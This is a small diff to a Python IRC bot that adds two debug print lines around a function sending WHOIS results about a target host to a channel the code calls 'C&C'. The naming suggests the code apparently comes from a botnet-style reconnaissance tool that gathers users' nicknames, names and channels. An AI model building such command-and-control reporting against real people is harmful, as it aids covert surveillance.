@@ -184,11 +184,13 @@ def ParseResult(result):
                 y = [x for (i, x) in enumerate(temps) if i not in (0, 1, 2, 3)]
                 UserS.Chan = str(y)
             if(temps[1] in '318'):
+                print("SENDING")
                 SendWhois()
 
 
 def SendWhois():
     """Send Whois results to C&C."""
+    print("Saying")
     bot.say(CC_CHANNEL, "Results for WHOIS on: " + TRGT_HOST)
     msg = "NICK: "+UserS.Nick+". NAME: "+UserS.Name
     print(msg)
